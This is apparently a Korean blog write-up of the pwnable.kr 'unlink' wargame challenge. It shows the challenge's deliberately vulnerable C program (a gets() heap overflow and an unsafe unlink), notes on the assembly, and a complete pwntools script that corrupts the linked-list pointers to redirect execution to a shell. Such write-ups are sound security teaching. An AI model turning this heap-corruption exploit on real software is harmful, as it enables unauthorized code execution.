---
title: "unlink"
description: "Daddy! how can I exploit unlink corruption?"
date: 2024-05-11
draft: false
starred: false
tags: ["wargame", "pwnable.kr"]
comments: false
---

Daddy! how can I exploit unlink corruption?

![스크린샷 2024-05-13 142732.png](/assets/content/blog/unlink/screenshot_2024-05-13_142732.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;
// tagOBJ 라는 struct를 OBJ로 재정의 한 것.

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;    // BK = ebp-0x4
        FD=P->fd;    // FD = A 의 buf 뒷 4-bytes
        FD->bk=BK;   // ???
        BK->fd=FD;   // ebp-0x4 가 A 의 뒷 buf 가리킴! 
}

int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        // heap 주소는 data 주소를 가리킨다.
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```

A의 heap 주소랑 

A의 heap 주소가 저장돼있는 stack (data) 주소를 알려준다.

### 아이디어

- 똑같은 크기의 heap alloc 은 붙어서 할당될 것임
- unlink() 에서 여러번 특정 주소에 저장된 값을 바꾸는 걸 활용
    - No PIE 인거 이용해서 shell() 주소 파악
    - stack 주소 준걸로 return 주소 파악
- return 주소가 있는 stack 주소에 shell() 주소를 넣어야함.

shell() == 0x080484eb

A heap 주소 

A stack 주소 - 4 = ret 주소

arrow operator 는 단순 offset 통해서 값 가져오는 것임.

그러나! unlink() 의 마지막 instruction 이 shell() 의 첫 instruction 을 이상한 걸로 바꿔서 안됨…

흠…

---

```nasm
   0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x08048602 <+211>:   leave
   0x08048603 <+212>:   lea    esp,[ecx-0x4]
   0x08048606 <+215>:   ret
End of assembler dump.
```

위의 코드를 보면 일반적이지 않은데… ~~그리고 개복잡한데…~~

- ecx 에 ebp-0x4 주소에 있는 값을 저장함. ecx == 0xFFFFD0C0
- ecx-0x4 (0xFFFFD0BC) 를 esp 에 저장함.
    - 0xFFFFD0BC 에는 0xf7da3519 가 있는데 이건 “__libc_start_call_main” 주소로 jmp 할 주소임!

**따라서…**

- ebp-0x4 가 가리키는 곳 -4 주소에 shell 주소가 있어야함!

- ****A의 buf 주소 알고 있으니까 ebp-0x4 가 A buf[4:8] 을 가리키면 좋을듯
    - A buf[:4] 에 쓰는 건 leak 된 A heap 주소로 가능
    - 그러나 ebp-0x4 는 stack 에 있어서 직접적으로 건드리지 못함.
        - unlink() 의 기능을 활용!
            - B 의 fd (FD) == A buf[4:8]
            - B 의 bk (BK) == ebp-0x4
            - 이렇게 세팅하면 unlink 과정에서 ebp-0x4 가 A buf[4:8] 을 가리키게 됨.

![KakaoTalk_20240515_005307135.jpg](/assets/content/blog/unlink/KakaoTalk_20240515_005307135.jpg)

## 익스 code

```python
#!/usr/bin/env python3
from pwn import *

# ssh unlink@pwnable.kr -p2222 (pw: guest)
myssh = ssh(user="unlink", host="pwnable.kr", password="guest", port=2222)
p = myssh.process("./unlink")

p.recvuntil(b"stack address leak: ")
stack_addr = int(p.recvline()[:-1].decode(), 16)
p.recvuntil(b"heap address leak: ")
heap_addr = int(p.recvline()[:-1].decode(), 16)

payload = p32(0x80484eb)            # shell address
payload += b"a" * 4                 # garbage
payload += b"a" * 8
payload += p32(heap_addr + 0xc)     # A buf[4:8]
payload += p32(stack_addr + 0x10)   # ebp-0x4

p.recvuntil(b"get shell!\n")
p.send(payload)

p.interactive()
```

🚩
